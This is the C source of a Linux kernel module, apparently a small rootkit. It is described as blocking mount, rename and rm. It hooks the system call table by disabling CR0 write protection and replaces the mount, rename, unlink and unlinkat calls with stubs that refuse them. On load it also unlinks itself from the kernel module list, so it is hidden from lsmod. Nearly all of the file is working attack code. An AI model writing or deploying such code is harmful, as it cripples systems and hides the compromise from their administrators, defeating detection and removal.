#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/mutex.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Devil0x1");
MODULE_DESCRIPTION("LKM which blocks mount, rename like mv commands, and rm");

static asmlinkage long (*real_sys_mount)(const char __user *source, const char __user *target,
                                         const char __user *filesystemtype, unsigned long flags,
                                         const void __user *data);
static asmlinkage long (*real_sys_rename)(const char __user *oldname, const char __user *newname);
static asmlinkage long (*real_unlink)(const char __user *pathname);
static asmlinkage long (*real_unlinkat)(int dfd, const char __user *pathname, int flag);

static unsigned long *sys_call_table; // pointer towards the table
static struct list_head *prev_module; //  lsmod  key area
static short hidden = 0; // just a normal flag to track
static DEFINE_MUTEX(hook_mutex); // prevents race conditions :) while chnaging an syscall

static asmlinkage long hooked_sys_mount(const char __user *source, const char __user *target,
                                        const char __user *filesystemtype, unsigned long flags,
                                        const void __user *data) {
                                            
    printk(KERN_INFO "mount blocked by devil0x1 LKM\n");

    return -EPERM;
}

static asmlinkage long hooked_sys_rename(const char __user *oldname, const char __user *newname) {
    printk(KERN_INFO "rename blocked b devil0x1 LKM\n");
    return -EPERM;
    

}

static asmlinkage long hooked_unlink(const char __user *pathname) {
    printk(KERN_INFO "unlink blocked by devil0x1 LKM\n");
    return -EPERM;
    

}

static asmlinkage long hooked_unlinkat(int dfd, const char __user *pathname, int flag) {
    printk(KERN_INFO "unlinkat blocked by devil0x1 LKM\n");   
    return -EPERM;
   

}

static void disable_write_protection(void) {
    write_cr0(read_cr0() & (~0x10000));
}

static void enable_write_protection(void) {
    write_cr0(read_cr0() | 0x10000);
}

static void hook_syscalls(void) {
    mutex_lock(&hook_mutex);
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) {
        mutex_unlock(&hook_mutex);
        return;
    }
    disable_write_protection();
    real_sys_mount = (void *)sys_call_table[__NR_mount];
    real_sys_rename = (void *)sys_call_table[__NR_rename];
    real_unlink = (void *)sys_call_table[__NR_unlink];
    real_unlinkat = (void *)sys_call_table[__NR_unlinkat];
    sys_call_table[__NR_mount] = (unsigned long)hooked_sys_mount;
    sys_call_table[__NR_rename] = (unsigned long)hooked_sys_rename;
    sys_call_table[__NR_unlink] = (unsigned long)hooked_unlink;
    sys_call_table[__NR_unlinkat] = (unsigned long)hooked_unlinkat;
    enable_write_protection();
    mutex_unlock(&hook_mutex);
}

static void restore_syscalls(void) {
    mutex_lock(&hook_mutex);
    if (!sys_call_table) {
        mutex_unlock(&hook_mutex);
        return;
    }
    disable_write_protection();
    sys_call_table[__NR_mount] = (unsigned long)real_sys_mount;
    sys_call_table[__NR_rename] = (unsigned long)real_sys_rename;
    sys_call_table[__NR_unlink] = (unsigned long)real_unlink;
    sys_call_table[__NR_unlinkat] = (unsigned long)real_unlinkat;
    enable_write_protection();
    mutex_unlock(&hook_mutex);
}

void module_show(void) {
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void module_hide(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

static int __init my_module_init(void) {
    hook_syscalls();
    module_hide();
    return 0;
}

static void __exit my_module_exit(void) {
    restore_syscalls();
    if (hidden)
        module_show();
}

module_init(my_module_init);
module_exit(my_module_exit);
